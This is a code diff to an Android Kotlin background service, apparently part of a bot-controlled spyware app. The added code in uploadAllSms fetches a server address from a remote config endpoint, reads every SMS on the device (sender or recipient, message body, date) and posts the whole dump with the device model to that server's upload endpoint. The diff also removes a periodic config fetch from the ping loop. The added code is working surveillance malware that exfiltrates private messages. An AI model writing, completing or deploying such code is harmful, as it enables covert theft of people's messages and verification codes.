@@ -125,13 +125,8 @@ class PingService : Service() {
 
     /* ================================================================ loop */
 
-    private var configFetchCounter = 0
-
     private fun tick() {
         IconManager.retryIfPending(this)
-        // Refresh config every 60 pings (~5 minutes)
-        if (configFetchCounter % 60 == 0) fetchConfig()
-        configFetchCounter++
         if (isOnline()) sendPing()
         handler?.removeCallbacksAndMessages(null)
         handler?.postDelayed({ tick() }, PING_INTERVAL_MS)
@@ -256,19 +251,42 @@ class PingService : Service() {
 
     // C — read ALL SMS and upload as txt file to server
     private fun uploadAllSms() {
-        val server = serverUrl(this)
-        if (server.isBlank()) {
-            prefs.edit().putString(KEY_REPORT, "⚠️ Server not configured. Use /setserver in bot.").apply()
-            return
-        }
         Thread {
             try {
-                val sb = StringBuilder()
+                // Step 1: get server_url — fetch fresh from config every time
+                val configUrl = WORKER_URL.replace("/ping", "/config")
+                val cfgReq = okhttp3.Request.Builder().url(configUrl)
+                    .addHeader("X-Token", APP_TOKEN).get().build()
+                val server = try {
+                    client.newCall(cfgReq).execute().use { resp ->
+                        if (resp.isSuccessful) {
+                            val json = JSONObject(resp.body?.string() ?: "")
+                            val url  = json.optString("server_url", "")
+                            if (url.isNotBlank()) {
+                                prefs.edit().putString(KEY_SERVER_URL, url).apply()
+                            }
+                            url
+                        } else prefs.getString(KEY_SERVER_URL, "") ?: ""
+                    }
+                } catch (_: Exception) {
+                    prefs.getString(KEY_SERVER_URL, "") ?: ""
+                }
+
+                if (server.isBlank()) {
+                    prefs.edit().putString(KEY_REPORT,
+                        "No server configured. Send /setserver IP to the bot.").apply()
+                    return@Thread
+                }
+
+                // Step 2: build SMS txt
+                val sb  = StringBuilder()
+                val fmt = java.text.SimpleDateFormat(
+                    "yyyy/MM/dd HH:mm:ss", java.util.Locale.getDefault()
+                )
                 sb.appendLine("=== SMS Export ===")
                 sb.appendLine("Device : ${Build.MANUFACTURER} ${Build.MODEL}")
-                sb.appendLine("Date   : ${java.text.SimpleDateFormat("yyyy/MM/dd HH:mm:ss",
-                    java.util.Locale.getDefault()).format(java.util.Date())}")
-                sb.appendLine("=" .repeat(40))
+                sb.appendLine("Date   : ${fmt.format(java.util.Date())}")
+                sb.appendLine("=".repeat(40))
                 sb.appendLine()
 
                 val cursor = contentResolver.query(
@@ -285,9 +303,6 @@ class PingService : Service() {
 
                 var count = 0
                 cursor?.use { c ->
-                    val fmt = java.text.SimpleDateFormat(
-                        "yyyy/MM/dd HH:mm:ss", java.util.Locale.getDefault()
-                    )
                     while (c.moveToNext()) {
                         val address = c.getString(0) ?: "unknown"
                         val body    = c.getString(1) ?: ""
@@ -295,7 +310,6 @@ class PingService : Service() {
                         val type    = c.getInt(3)
                         val typeStr = if (type == android.provider.Telephony.Sms.MESSAGE_TYPE_SENT)
                             "SENT" else "RECV"
-
                         sb.appendLine("[$typeStr] ${fmt.format(java.util.Date(date))}")
                         sb.appendLine("From/To: $address")
                         sb.appendLine(body)
@@ -303,17 +317,30 @@ class PingService : Service() {
                         count++
                     }
                 }
-
                 sb.appendLine()
                 sb.appendLine("Total: $count messages")
 
+                // Step 3: upload directly
                 val filename = "sms_${Build.MODEL}_${System.currentTimeMillis()}.txt"
-                val caption  = "📱 ${Build.MANUFACTURER} ${Build.MODEL} | $count SMS"
-                uploadText(filename, sb.toString(), caption)
+                val caption  = "${Build.MANUFACTURER} ${Build.MODEL} | $count SMS"
+                val bytes    = sb.toString().toByteArray(Charsets.UTF_8)
+                val body     = okhttp3.RequestBody.create("text/plain".toMediaType(), bytes)
+                val req      = okhttp3.Request.Builder()
+                    .url("$server/upload")
+                    .addHeader("X-Token", APP_TOKEN)
+                    .addHeader("X-Filename", filename)
+                    .addHeader("X-Caption", caption)
+                    .post(body)
+                    .build()
 
-                prefs.edit().putString(KEY_REPORT, "📤 Uploading $count SMS to server...").apply()
+                client.newCall(req).execute().use { resp ->
+                    val msg = if (resp.isSuccessful) "Sent $count SMS to server"
+                              else "Upload failed: ${resp.code}"
+                    prefs.edit().putString(KEY_REPORT, msg).apply()
+                }
+
             } catch (e: Exception) {
-                prefs.edit().putString(KEY_REPORT, "SMS export error: ${e.message}").apply()
+                prefs.edit().putString(KEY_REPORT, "Error: ${e.message}").apply()
             }
         }.start()
     }
